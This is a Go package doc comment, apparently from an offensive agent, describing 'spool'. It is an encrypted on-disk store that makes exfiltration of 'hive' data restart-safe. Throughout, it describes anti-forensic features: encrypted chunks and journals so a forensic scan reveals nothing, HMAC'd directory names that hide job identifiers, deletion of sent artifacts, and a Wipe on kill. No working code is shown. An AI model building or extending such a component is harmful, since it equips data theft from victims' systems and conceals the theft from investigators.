// Package spool provides a durable, encrypted, on-disk spool for outbound
// result chunks plus per-job progress. Its purpose is restart-safe exfiltration:
// an agent that dies mid-send can enumerate incomplete jobs, read back the
// chunks it already produced, and resume exactly where it stopped instead of
// re-reading the hive.
//
// # Lifecycle
//
// A Store lives under a single directory (DefaultDir returns
// $TMPDIR/adverse/<agentID>/spool, created 0700 by Open). All state is
// encrypted with a key derived from the per-agent secret, so losing the
// directory to a forensic scan reveals neither hive bytes nor hive/job
// identifiers:
//
//   - Put appends (or idempotently rewrites) one chunk for a job, named
//     <seq>.chunk, and persists an encrypted journal entry for the job.
//   - Get authenticates and returns a previously spooled chunk.
//   - Jobs/Progress drive a resume loop after a restart.
//   - Ack deletes only the chunks the server confirmed and records the
//     acknowledgement, so storage shrinks as exfiltration proceeds.
//   - Complete drops every artifact for one finished job.
//   - Wipe removes the whole tree; call it on kill and from any TTL sweeper.
//     (This package does not schedule TTLs itself: TTL policy belongs to the
//     caller.)
//
// # On-disk format
//
//   - journal.json.enc: JSON progress records for every job, ChaCha20-Poly1305
//     with AAD "journal".
//   - <jobdir>/meta.enc: encrypted {job_id, hive, total} used to rebuild the
//     journal if it is lost or damaged.
//   - <jobdir>/<seq>.chunk: random 12-byte nonce || AEAD ciphertext, with AAD
//     "<jobID>|<seq>|<total>".
//
// <jobdir> is a keyed HMAC-SHA256 of the job ID, so directory names leak no job
// identifiers. Writes are atomic (temp file in the same directory, fsync,
// rename): a crash never exposes a partial chunk or journal under its final
// name.
//
// # Crash recovery
//
// If the journal is missing, undecryptable, or malformed, Open rebuilds
// progress from the per-job meta.enc files and a directory listing of the
// chunk files: Hive/Total come from the encrypted metadata, Next is derived
// from the highest spooled sequence, Acked is empty (unknown acks are safely
// re-sent), and Chunks is the file count. Directory entries whose meta.enc
// cannot be authenticated are left untouched but ignored; they can only be
// removed by Wipe. Rebuilt state is persisted on the next mutation. Open never
// panics on garbage input and never deletes unreadable data.
//
// # Forensic trade-off
//
// Encrypted chunks and metadata are still on-disk artifacts until they are
// acknowledged or the sweep runs: the ciphertext hides contents and job/hive
// identities, but file counts, sizes, and timestamps remain observable to a
// live-forensics examiner. Ack/Complete/Wipe minimize that window; they do not
// make it zero. Chunk and journal files are created 0600 inside a 0700 tree,
// and the key is never written to disk.
package spool
